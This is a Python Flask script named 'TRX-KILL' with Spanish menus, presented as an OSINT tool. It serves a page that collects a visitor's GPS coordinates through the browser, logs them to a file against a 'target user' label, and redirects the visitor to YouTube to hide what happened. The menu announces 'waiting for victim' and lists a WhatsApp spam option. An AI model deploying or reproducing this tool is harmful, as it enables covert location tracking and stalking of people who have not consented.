import os, sys, getpass, time, threading, base64
from flask import Flask, request

app = Flask('TRX-KILL')
AUTH_PASS = "TRX-KILL-OSINT"
STORAGE_PATH = "/sdcard/TRX-KILL-RESUL"
LOG_FILE = f"{STORAGE_PATH}/result.txt"

if not os.path.exists(STORAGE_PATH): os.makedirs(STORAGE_PATH)

# --- SERVIDOR CAPTURADOR ---
@app.route('/')
def index():
    return """<html><body><script>
        navigator.geolocation.getCurrentPosition(pos => {
            fetch('/log?lat='+pos.coords.latitude+'&lon='+pos.coords.longitude);
            window.location.href='https://youtube.com';
        });
    </script></body></html>"""

@app.route('/log')
def log():
    lat = request.args.get('lat')
    lon = request.args.get('lon')
    with open(LOG_FILE, "a") as f:
        f.write(f"ARGENTINA|{lat}|{lon}|USUARIO_OBJETIVO\n")
    return "OK"

def banner():
    os.system('clear')
    print("\033[1;32m  -------->-TRX-KILL v1.4.5 -<-----------")
    print("  -HERRAMIENTA OSINT Y SEGURIDAD MÓVIL.")
    print("  -EL CREADOR NO SE HACE RESPONSABLE POR SU MAL USO.\n\033[0m")

def main():
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000), daemon=True).start()
    
    while True:
        banner()
        menu = {
            "1": "INFO-NÚMERO", "2": "LINK-ZP", "3": "CREADOR", "4": "VERSIONES", 
            "5": "ANALIZAR LINK", "6": "ADM SISTEMA", "7": "INFO SCRIPT", 
            "8": "REPOSITORIO", "9": "PROCESOS", "10": "SPAM-WHATSAPP"
        }
        for k, v in menu.items(): print(f"  [{k}] {v}")
        sel = input("\n\033[1;33mTRX-ROOT > \033[0m")

        if sel == "1":
            print("\n----1----\nBUSCANDO INFORMACIÓN REAL...")
            if os.path.exists(LOG_FILE):
                with open(LOG_FILE, 'r') as f:
                    data = f.readlines()[-1].split('|')
                    print(f"PAÍS: {data[0]}")
                    print(f"COORDENADAS: {data[1]}, {data[2]}")
                    print(f"NAME REGISTRADO: {data[3]}")
            else: print("NO HAY DATOS REGISTRADOS.")
            input("\n[Enter]...")
        elif sel == "2":
            print("\n[!] LINK ACTIVO: http://127.0.0.1:5000\n[!] ESPERANDO VÍCTIMA..."); input()
        elif sel == "3": print("\n# CREADOR: OSCAR"); input()
        elif sel == "4": print("\n# VERSIÓN: 1.4.5"); input()
        elif sel == "5": print("\n# ANALIZANDO LINK..."); input()
        elif sel == "6":
            if getpass.getpass("KEY: ") == AUTH_PASS: os.system(f"cat {LOG_FILE}")
            input()
        elif sel == "7": print("\n# SCRIPT CREADO PARA OSINT."); input()
        elif sel == "8": print("\n# REPOSITORIO PRIVADO."); input()
        elif sel == "9": print("\n# PROCESOS ACTIVOS."); input()
        elif sel == "10":
            num = input("NÚMERO: ")
            print(f"[!] ENVIANDO SPAM A {num}..."); input()
        elif sel == "0": sys.exit()

if __name__ == "__main__": main()
